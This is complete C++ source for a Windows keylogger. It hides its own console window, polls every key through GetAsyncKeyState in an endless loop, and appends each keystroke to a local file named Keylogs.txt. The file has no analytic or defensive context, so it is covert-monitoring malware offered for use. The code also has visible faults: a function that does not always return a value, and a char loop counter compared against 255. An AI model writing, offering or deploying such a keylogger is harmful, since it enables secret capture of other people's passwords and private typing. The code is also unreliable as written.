#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
 
using std::fstream;
using std::ofstream;
 
void WriteData(std::string Text) {
    ofstream LogFile;
    LogFile.open("Keylogs.txt", fstream::app);
    LogFile << Text;
    LogFile.close();
}
 
void Stealth() {  //hide our window where the process runs..
    HWND hWnd;
    AllocConsole(); //allocate console
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0); //to hide
}
 
bool isKeyListed(int vKey) {
    switch (vKey) {
    case VK_RETURN:  // VK_RETURN is the name for ascii value of enter key..
        WriteData("\n");
        break;
    case VK_BACK:
        WriteData("\b");
        break;
    case VK_SPACE:
        WriteData(" ");
        break;
    case VK_SHIFT:
        WriteData(" *shift* ");
        break;
    case VK_OEM_PERIOD:
        WriteData(".");
        break;
    default: return false;
    }
}
 
int main() {
    Stealth();
    char Key;
    while (1) {
        for (Key = 8; Key <= 255; Key++) {
            if (GetAsyncKeyState(Key) == -32767) {   //to detect key press
                if (isKeyListed(Key) == 0) {         //if key isn't in the listed keys..
                    ofstream LogFile;
                    LogFile.open("Keylogs.txt", fstream::app);
                    LogFile << Key;
                    LogFile.close();
                }
            }
        }
    }
}